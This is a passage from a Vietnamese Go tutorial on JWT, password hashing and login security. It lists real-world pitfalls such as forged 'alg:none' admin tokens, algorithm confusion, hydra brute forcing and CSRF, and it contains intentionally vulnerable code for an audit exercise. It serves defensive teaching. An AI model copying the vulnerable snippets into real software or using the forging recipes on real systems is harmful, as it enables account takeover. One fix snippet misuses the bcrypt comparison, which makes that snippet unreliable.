> 📝 **Tóm tắt mục 14**: MFA = ≥ 2 yếu tố. TOTP là sweet spot UX/security. SMS chỉ là biện pháp tối thiểu.

---

## 15. Security pitfalls — checklist real-world

### 15.1 `alg: none` attack

Một số lib JWT cũ chấp nhận `{"alg":"none"}` (không signature). Attacker tạo token:

```
header  = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"sub":"42","role":"admin"})
token   = header + "." + payload + "."   // signature rỗng
```

Lib không kiểm `alg` → trust payload → admin. **Cách chống**: trong `keyFunc` luôn check method type, từ chối `alg=none` mọi lúc.

### 15.2 Alg confusion (HS256 / RS256)

Server expect RS256 (public key), attacker gửi token `alg=HS256` ký bằng **public key đó** như HMAC secret. Lib non-strict sẽ verify thành công (vì cùng public key dùng làm HMAC secret).

**Chống**: callback `keyFunc` của lib phải fix method type:

```go
parsed, _ := jwt.Parse(s, func(t *jwt.Token) (any, error) {
    if t.Method != jwt.SigningMethodRS256 {
        return nil, errors.New("unexpected alg")
    }
    return publicKey, nil
})
```

### 15.3 Secret leak

- JWT secret hard-coded trong source → push lên GitHub public → bot quét vài giờ tìm thấy.
- Secret trong `.env` không add `.gitignore`.
- Secret trong CI log (print env).

**Chống**: secret từ env var, secret manager (Vault, AWS Secrets Manager, GCP Secret Manager). `gitleaks` quét CI.

### 15.4 Plaintext password

DB column `password VARCHAR(100)` chứa nguyên password. Một SQL injection / backup leak → mọi user lộ. Hash bằng bcrypt/argon2.

### 15.5 No rate limit on login

Endpoint `POST /login` không rate-limit → attacker chạy `hydra` thử 100 password/giây. Với password yếu, vài giờ là vào.

**Chống**:
- Rate limit theo IP: 5 fail / 15 phút.
- Rate limit theo username: 5 fail / 15 phút (tránh attacker đổi IP).
- Captcha sau 3 fail.
- Account lock tạm sau 10 fail (kết hợp counter exponential backoff).

### 15.6 Refresh token không rotation

Attacker chôm refresh, dùng đổi access → user thật không biết, vẫn dùng app bình thường vì attacker không xoay refresh. Lossless cho attacker.

**Chống**: mỗi lần đổi refresh thì invalidate cũ + cấp mới. Nếu thấy refresh cũ được dùng lại (đã invalidate) → **trigger panic**: revoke toàn bộ refresh của user, force re-login.

### 15.7 Timing attack ở password compare

```go
if storedHash == computedHash { /* OK */ }  // BAD
```

So sánh byte-by-byte, early-exit khi gặp byte khác. Attacker đo thời gian → suy ngược byte.

**Chống**: `subtle.ConstantTimeCompare(a, b) == 1`. Bcrypt lib đã làm sẵn.

### 15.8 JWT chứa data nhạy cảm

Payload JWT chỉ **encode**, không **encrypt**. Bất kỳ ai có token đều đọc được.

- ❌ Đừng nhét: SSN, credit card, password, full medical record.
- ✅ Nhét: user ID, role, scope (data có thể public hoặc derive được từ user ID đã có ở DB).

Nếu thực sự cần encrypt → **JWE** (JSON Web Encryption), nhưng phức tạp hơn và hiếm dùng cho session.

### 15.9 XSS làm lộ token

LocalStorage / cookie không HttpOnly đều dễ bị XSS xơi. Một dòng JS injected = exfiltrate token đi.

**Chống**: CSP (Content-Security-Policy) chặt, input sanitization, cookie HttpOnly cho refresh.

### 15.10 CSRF với cookie auth

Nếu auth = cookie (server tự đọc), attacker tạo trang `<form action=victim.com/transfer>` user click submit → request đi kèm cookie victim.

**Chống**: `SameSite=Lax` (chặn cross-origin form submit) hoặc CSRF token kèm mọi POST/PUT/DELETE.

> 📝 **Tóm tắt mục 15**: alg=none, alg-confusion, leaked secret, plaintext password, no rate limit, refresh không rotate, timing compare, JWT chứa PII, XSS exfil, CSRF — **10 lỗi này là 90% sự cố production**.

---

## 16. Bài tập

> Mỗi bài đều có lời giải chi tiết ở mục 17. Cố gắng tự code trước khi xem.

### BT1 — Sign JWT HS256

Viết hàm `signJWT(claims map[string]any, secret []byte) (string, error)` trả về JWT có format `header.payload.signature`, dùng HS256.

### BT2 — Parse & verify JWT

Viết hàm `verifyJWT(token string, secret []byte) (map[string]any, error)`. Kiểm tra: số phần = 3, `alg` = HS256, signature đúng, `exp` > now (nếu có).

### BT3 — Auth middleware put user info in context

Viết `AuthMiddleware(secret []byte)` đọc `Authorization: Bearer <token>`, verify, gắn `User{ID, Role}` vào context. Viết thêm helper `UserFromContext(ctx)`.

### BT4 — Hash password bcrypt

Viết `HashPassword(plain string) (string, error)` dùng bcrypt cost 12, và `CheckPassword(plain, hash string) bool`.

Nếu không có `golang.org/x/crypto/bcrypt` available (offline test), dùng `pbkdf2` từ stdlib via `crypto/hkdf` hoặc tự implement loop `sha256(salt+pw)` 100k lần — chỉ minh họa, đánh dấu rõ "demo".

### BT5 — Refresh token flow

Viết 2 handler:

- `POST /login` — body `{user, pass}`. Trả `{access, refresh}` (access JWT 15min, refresh random 32 byte lưu memory map).
- `POST /refresh` — body `{refresh}`. Lookup map → invalidate cũ → cấp pair mới.

### BT6 — Audit 4 antipattern

Cho 4 đoạn code, chỉ ra lỗi bảo mật và cách sửa:

```go
// A) JWT verify
parsed, _ := jwt.Parse(s, func(t *jwt.Token) (any, error) {
    return []byte(secret), nil
})

// B) Login handler
func login(w http.ResponseWriter, r *http.Request) {
    db.Query("SELECT * FROM users WHERE pass=?", r.FormValue("password"))
    // ...
}

// C) Rate limit
func login(w http.ResponseWriter, r *http.Request) {
    user, pass := parse(r)
    if !verify(user, pass) { http.Error(w, "wrong", 401); return }
    // OK
}

// D) Config
const JWT_SECRET = "supersecret123"
```

---

## 17. Lời giải chi tiết

### Giải BT1 — Sign JWT HS256

**Cách tiếp cận**:
1. Marshal header `{"alg":"HS256","typ":"JWT"}` → bytes → base64url (không padding).
2. Marshal claims → base64url.
3. Concat `header.payload`, HMAC-SHA256 với secret → 32 byte → base64url → signature.
4. Trả về `header.payload.signature`.

```go
func base64URLEncode(b []byte) string {
    return base64.RawURLEncoding.EncodeToString(b)
}

func signJWT(claims map[string]any, secret []byte) (string, error) {
    headerJSON, _ := json.Marshal(map[string]string{"alg": "HS256", "typ": "JWT"})
    payloadJSON, err := json.Marshal(claims)
    if err != nil { return "", err }

    h := base64URLEncode(headerJSON)
    p := base64URLEncode(payloadJSON)
    input := h + "." + p

    mac := hmac.New(sha256.New, secret)
    mac.Write([]byte(input))
    sig := base64URLEncode(mac.Sum(nil))

    return input + "." + sig, nil
}
```

Chi phí: 1 HMAC + 2 marshal JSON + 3 base64 encode ≈ 5–10 µs với token ngắn.

### Giải BT2 — Verify JWT

**Cách tiếp cận**:
1. Split token theo `.`, kiểm tra đủ 3 phần.
2. Decode header, parse JSON, check `alg=HS256`.
3. Recompute signature từ `header.payload` + secret. So sánh **constant-time** với signature trong token.
4. Decode payload, check `exp > now` nếu có.

```go
func verifyJWT(token string, secret []byte) (map[string]any, error) {
    parts := strings.Split(token, ".")
    if len(parts) != 3 {
        return nil, errors.New("malformed token")
    }
    headerRaw, err := base64.RawURLEncoding.DecodeString(parts[0])
    if err != nil { return nil, err }
    var header map[string]string
    if err := json.Unmarshal(headerRaw, &header); err != nil { return nil, err }
    if header["alg"] != "HS256" {
        return nil, fmt.Errorf("unexpected alg: %q", header["alg"])
    }

    input := parts[0] + "." + parts[1]
    mac := hmac.New(sha256.New, secret)
    mac.Write([]byte(input))
    expectedSig := mac.Sum(nil)

    actualSig, err := base64.RawURLEncoding.DecodeString(parts[2])
    if err != nil { return nil, err }
    if !hmac.Equal(expectedSig, actualSig) {
        return nil, errors.New("invalid signature")
    }

    payloadRaw, err := base64.RawURLEncoding.DecodeString(parts[1])
    if err != nil { return nil, err }
    var claims map[string]any
    if err := json.Unmarshal(payloadRaw, &claims); err != nil { return nil, err }

    if expVal, ok := claims["exp"]; ok {
        if expF, ok := expVal.(float64); ok {
            if time.Now().Unix() > int64(expF) {
                return nil, errors.New("token expired")
            }
        }
    }
    return claims, nil
}
```

`hmac.Equal` đã constant-time. Trả `claims` cho caller.

Độ phức tạp: $O(\text{len(token)})$ cho HMAC + parse JSON. Vài µs với token ngắn.

### Giải BT3 — Auth middleware + context helper

```go
type ctxKey int
const userCtxKey ctxKey = 0

type User struct {
    ID   string
    Role string
}

func AuthMiddleware(secret []byte) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            authHeader := r.Header.Get("Authorization")
            const prefix = "Bearer "
            if !strings.HasPrefix(authHeader, prefix) {
                http.Error(w, "missing bearer", http.StatusUnauthorized)
                return
            }
            tok := strings.TrimPrefix(authHeader, prefix)
            claims, err := verifyJWT(tok, secret)
            if err != nil {
                http.Error(w, "invalid token: "+err.Error(), http.StatusUnauthorized)
                return
            }
            sub, _ := claims["sub"].(string)
            role, _ := claims["role"].(string)
            u := User{ID: sub, Role: role}
            ctx := context.WithValue(r.Context(), userCtxKey, u)
            next.ServeHTTP(w, r.WithContext(ctx))
        })
    }
}

func UserFromContext(ctx context.Context) (User, bool) {
    u, ok := ctx.Value(userCtxKey).(User)
    return u, ok
}
```

`ctxKey` là **type private**, đảm bảo không có middleware khác vô tình ghi đè key cùng tên.

### Giải BT4 — Password hash demo (bcrypt-style fallback)

Bcrypt thật cần `golang.org/x/crypto/bcrypt`. Để `solutions.go` biên dịch không cần module ngoài, dùng pattern PBKDF2 đơn giản với stdlib `crypto/sha256`:

```go
func HashPassword(plain string) (string, error) {
    salt := make([]byte, 16)
    if _, err := rand.Read(salt); err != nil { return "", err }
    iter := 100_000
    hash := pbkdf2(plain, salt, iter)
    // format: "pbkdf2$<iter>$<salt-b64>$<hash-b64>"
    return fmt.Sprintf("pbkdf2$%d$%s$%s", iter,
        base64.RawStdEncoding.EncodeToString(salt),
        base64.RawStdEncoding.EncodeToString(hash)), nil
}

func CheckPassword(plain, encoded string) bool {
    parts := strings.Split(encoded, "$")
    if len(parts) != 4 || parts[0] != "pbkdf2" { return false }
    iter, err := strconv.Atoi(parts[1])
    if err != nil { return false }
    salt, _ := base64.RawStdEncoding.DecodeString(parts[2])
    expected, _ := base64.RawStdEncoding.DecodeString(parts[3])
    got := pbkdf2(plain, salt, iter)
    return subtle.ConstantTimeCompare(expected, got) == 1
}

func pbkdf2(password string, salt []byte, iter int) []byte {
    // tóm lược PBKDF2-HMAC-SHA256 ra 32 byte (1 block).
    block := make([]byte, len(salt)+4)
    copy(block, salt)
    binary.BigEndian.PutUint32(block[len(salt):], 1)
    u := hmacSHA256([]byte(password), block)
    out := make([]byte, len(u))
    copy(out, u)
    for i := 1; i < iter; i++ {
        u = hmacSHA256([]byte(password), u)
        for j := range out { out[j] ^= u[j] }
    }
    return out
}
```

**Trong production**: dùng `bcrypt.GenerateFromPassword(plain, 12)` và `bcrypt.CompareHashAndPassword`. PBKDF2 với 100k iter tương đương ~ bcrypt cost 10 trên CPU, nhưng GPU-resistant kém hơn argon2.

Constant-time compare bằng `subtle.ConstantTimeCompare` — KHÔNG `bytes.Equal`.

### Giải BT5 — Refresh token flow

```go
var (
    refreshStore = map[string]string{} // refresh → userID
    storeMu      sync.Mutex
)

func randomToken(n int) string {
    b := make([]byte, n)
    rand.Read(b)
    return base64.RawURLEncoding.EncodeToString(b)
}

func loginHandler(secret []byte) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var body struct{ User, Pass string }
        json.NewDecoder(r.Body).Decode(&body)
        // (giả lập) verify user/pass:
        if !CheckPassword(body.Pass, lookupHash(body.User)) {
            http.Error(w, "bad creds", http.StatusUnauthorized); return
        }
        access, _ := signJWT(map[string]any{
            "sub": body.User, "role": "user",
            "exp": time.Now().Add(15 * time.Minute).Unix(),
            "iat": time.Now().Unix(),
        }, secret)
        refresh := randomToken(32)
        storeMu.Lock(); refreshStore[refresh] = body.User; storeMu.Unlock()
        json.NewEncoder(w).Encode(map[string]string{"access": access, "refresh": refresh})
    }
}

func refreshHandler(secret []byte) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var body struct{ Refresh string }
        json.NewDecoder(r.Body).Decode(&body)
        storeMu.Lock()
        userID, ok := refreshStore[body.Refresh]
        if ok { delete(refreshStore, body.Refresh) } // rotation: invalidate cũ
        storeMu.Unlock()
        if !ok {
            // Có thể là reuse → revoke all session của user (production)
            http.Error(w, "invalid refresh", http.StatusUnauthorized); return
        }
        newAccess, _ := signJWT(map[string]any{
            "sub": userID, "role": "user",
            "exp": time.Now().Add(15 * time.Minute).Unix(),
        }, secret)
        newRefresh := randomToken(32)
        storeMu.Lock(); refreshStore[newRefresh] = userID; storeMu.Unlock()
        json.NewEncoder(w).Encode(map[string]string{"access": newAccess, "refresh": newRefresh})
    }
}
```

Lưu ý:
- `refreshStore` là `map`, production phải là Redis hoặc DB.
- `delete + insert` không atomic — production cần transaction.
- Khi `ok == false` mà token có format hợp lệ → nghi attacker reuse → revoke toàn bộ session của user (cần index `refresh → userID` để biết user nào).

### Giải BT6 — Audit antipattern

**A) `keyFunc` không check method**:

```go
parsed, _ := jwt.Parse(s, func(t *jwt.Token) (any, error) {
    return []byte(secret), nil   // BUG
})
```

Lỗi: attacker gửi `alg=none` hoặc `alg=RS256` (với public key dùng làm HMAC secret) → bypass.

**Sửa**:

```go
parsed, _ := jwt.Parse(s, func(t *jwt.Token) (any, error) {
    if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
        return nil, errors.New("unexpected method")
    }
    return []byte(secret), nil
})
```

**B) Plaintext password trong DB + SQL injection**:

```go
db.Query("SELECT * FROM users WHERE pass=?", r.FormValue("password"))
```

Hai lỗi:
1. `pass` đang chứa password **plaintext** (`WHERE pass=?` so sánh giá trị nguyên).
2. Tuy có placeholder (`?`) nên không SQL injection, **nhưng** vẫn lộ trong DB backup, log slow query.

**Sửa**: lưu hash, query theo username, compare hash trong code:

```go
row := db.QueryRow("SELECT password_hash FROM users WHERE username=?", username)
var hash string
row.Scan(&hash)
if !bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) { /* OK */ }
```

**C) Không rate limit login**:

```go
func login(w http.ResponseWriter, r *http.Request) {
    user, pass := parse(r)
    if !verify(user, pass) { http.Error(w, "wrong", 401); return }
}
```

Lỗi: attacker brute force vô hạn.

**Sửa**: middleware rate-limit theo IP + theo username (golang.org/x/time/rate, hoặc Redis token-bucket). Ví dụ:

```go
mux.Handle("POST /login",
    RateLimitMiddleware(5, time.Minute)(http.HandlerFunc(login)))
```

Thêm exponential backoff hoặc captcha sau N fail.

**D) Secret hardcoded**:

```go
const JWT_SECRET = "supersecret123"
```

Lỗi: secret nằm trong source. Push GitHub = lộ. `git log` luôn còn dấu vết kể cả khi sửa.

**Sửa**: đọc từ env var hoặc secret manager:

```go
secret := os.Getenv("JWT_SECRET")
if len(secret) < 32 { log.Fatal("JWT_SECRET must be ≥ 32 bytes") }
```

Quét secret leak trong CI: `gitleaks`, `trufflehog`.

---

## 18. Code & Minh họa

- [`solutions.go`](./solutions.go) — Implement HMAC-SHA256 JWT bằng `crypto/hmac` + `crypto/sha256` + `encoding/base64`. Có demo `main()` ký + verify + middleware + login/refresh handler + password hash PBKDF2-SHA256 fallback. Biên dịch không cần lib ngoài.
- [`visualization.html`](./visualization.html) — 3 module tương tác:
  1. **JWT decoder** — paste JWT, decode header/payload/signature, verify với secret.
  2. **Token lifecycle** — animate access/refresh token theo timeline, rotation, expire.
  3. **Password hash speed** — compare plain / SHA-256 / bcrypt / argon2 về tốc độ và resistance.

---

## 19. Bài tiếp theo

➡ **[L47 — TLS & Crypto Basics](../lesson-47-tls-crypto-basics/)**: TLS handshake, certificate chain, `crypto/*` stdlib, AES-GCM, HMAC, key derivation. Lesson này (L46) đã chạm vào HMAC và password hashing — L47 sẽ đi sâu vào crypto primitives và TLS layer dưới.

Các lesson liên quan đã có:
- [L42 — net/http Deep](../lesson-42-http-net-deep/) — middleware foundation cho AuthMiddleware.
- [L43 — REST API Design](../lesson-43-rest-api-design/) — chuẩn HTTP status (401 vs 403).
- [L45 — Request Validation](../lesson-45-request-validation/) — validate input trước khi vào auth flow.
- [L52 — Rate Limiting](../lesson-52-rate-limiting-circuit-breaker/) — chống brute force login.
- [L53 — Mini-project REST API](../lesson-53-mini-project-rest-api/) — ráp tất cả: auth + CRUD + middleware end-to-end.

---

*Cảm ơn bạn đã đọc đến đây. Hẹn gặp ở Lesson 47.*
